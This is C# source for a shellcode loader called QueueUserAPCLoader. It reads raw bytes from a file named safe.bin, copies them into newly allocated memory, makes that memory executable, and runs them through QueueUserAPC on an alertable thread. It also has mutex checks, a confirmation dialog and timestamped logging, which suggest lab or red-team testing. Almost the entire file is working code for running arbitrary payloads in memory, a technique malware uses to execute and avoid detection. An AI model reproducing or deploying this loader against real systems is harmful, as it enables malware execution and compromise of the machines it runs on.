using System;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace QueueUserAPCLoader
{
	class Program
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CreateMutex(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);
		[DllImport("kernel32.dll")]
		private static extern uint GetLastError();
		[DllImport("kernel32.dll")]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
		[DllImport("kernel32.dll")]
		private static extern bool VirtualProtectEx(IntPtr handle, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
		[DllImport("kernel32.dll")]
		public static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
		[DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
		[DllImport("kernel32.dll")]
		public static extern uint ResumeThread(IntPtr hThread);
		[DllImport("kernel32.dll")]
		public static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, IntPtr lpName);
		[DllImport("kernel32.dll")]
		public static extern uint SignalObjectAndWait(IntPtr hObjectToSignal, IntPtr hObjectToWaitOn, uint dwMilliseconds, bool bAlertable);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hObject);
		[DllImport("kernel32.dll")]
		private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);


		// Constant for ERROR_ALREADY_EXISTS (mutex is already owned by another process)
		private const uint ERROR_ALREADY_EXISTS = 183;
		private static readonly UInt32 MEM_COMMIT = 0x1000;
		private static readonly UInt32 MEM_RESERVE = 0x2000;
		private static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
		private static readonly UInt32 PAGE_READWRITE = 0x04;
		private static readonly UInt32 PAGE_EXECUTE_READWRITE = 0x40;
		private const uint CREATE_SUSPENDED = 0x00000004;
		private const uint INFINITE = 0xFFFFFFFF;
		public static void AlertableFunction()
		{
			IntPtr hEvent1 = CreateEvent(IntPtr.Zero, false, false, IntPtr.Zero);
			IntPtr hEvent2 = CreateEvent(IntPtr.Zero, false, false, IntPtr.Zero);

			if (hEvent1 != IntPtr.Zero && hEvent2 != IntPtr.Zero)
			{
				SignalObjectAndWait(hEvent1, hEvent2, INFINITE, true);
				CloseHandle(hEvent1);
				CloseHandle(hEvent2);
			}
		}
		public static void suspendedDummy(IntPtr lpParam)
		{
			int a = 4;
			int b = a + 5;
		}
		private static StreamWriter writer;

		public static void FileWriter()
		{
			string baseDirectory = Directory.GetCurrentDirectory();

			string outputFilePath = Path.Combine(baseDirectory, "output.txt");

			// Create or overwrite the output file and write to it
			writer = new StreamWriter(outputFilePath, false); // 'false' means overwrite
		}
		public static void WriteLineWithTimestamp(string line)
		{
			try
			{
				string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

				writer.WriteLine($"[{timestamp}] {line}");

				// Flush immediately to ensure the data is written to the file
				writer.Flush();
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error writing to file: " + ex.Message);
			}
		}
		delegate void THREAD_START_ROUTINE(IntPtr lpParam);

		static void Main(string[] args)
		{
			FileWriter();

			WriteLineWithTimestamp("before mutex");
			string mutexName = "TestMutex";
			IntPtr hMutex = CreateMutex(IntPtr.Zero, false, mutexName);
			if (hMutex == IntPtr.Zero || GetLastError() == ERROR_ALREADY_EXISTS)
			{
				WriteLineWithTimestamp("mutex already in use");

			}
			else
			{
				//payload is not running
				DialogResult result = MessageBox.Show("After Mutex: Do you want to continue?", "Question", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (result == DialogResult.Yes)
				{
					string filePath = Path.Combine(Directory.GetCurrentDirectory(), "safe.bin");
					if (!File.Exists(filePath))
					{
						WriteLineWithTimestamp(filePath + " does not exist ");

					}
					byte[] buf = File.ReadAllBytes(filePath);
					WriteLineWithTimestamp(filePath + " has a size of " + buf.Length);

					Process currentProcess = Process.GetCurrentProcess();
					IntPtr handleCP = currentProcess.Handle;

					//THREAD_START_ROUTINE m_threadProcDelegate = new THREAD_START_ROUTINE(suspendedDummy);
					uint threadId = 0;
					//suspended thread
					//IntPtr hThread = CreateThread(IntPtr.Zero, 0, Marshal.GetFunctionPointerForDelegate(m_threadProcDelegate), IntPtr.Zero, CREATE_SUSPENDED, out threadId);
					// alertable function
					IntPtr hThread = CreateThread(IntPtr.Zero, 0, Marshal.GetFunctionPointerForDelegate((ThreadStart)AlertableFunction), IntPtr.Zero, 0, out threadId);

					if (hThread == IntPtr.Zero)
					{
						WriteLineWithTimestamp("failed to create thread: " + GetLastError());

					}
					IntPtr funcAddr = VirtualAllocEx(handleCP, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

					WriteLineWithTimestamp("ThreadID: " + threadId);
					Marshal.Copy(buf, 0, funcAddr, buf.Length);

					uint oldProtect = 0;
					bool memRX = VirtualProtectEx(handleCP, funcAddr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);
					if (memRX)
					{
						WriteLineWithTimestamp("Resume ThreadID: " + threadId);
						// if `hThread` is in an alertable state, QueueUserAPC will run the payload directly
						// if `hThread` is in a suspended state, the payload won't be executed unless the thread is resumed after
						bool apc = QueueUserAPC(funcAddr, hThread, IntPtr.Zero);
						if (!apc)
						{
							WriteLineWithTimestamp("Queue User Failed: " + GetLastError());
						}
						// if thread is suspended...
						//ResumeThread(hThread);
						WaitForSingleObject(hThread, 0xFFFFFFFF);
						WriteLineWithTimestamp("Done Waiting for Single Object");

					}
				}
			}
		}
	}
}
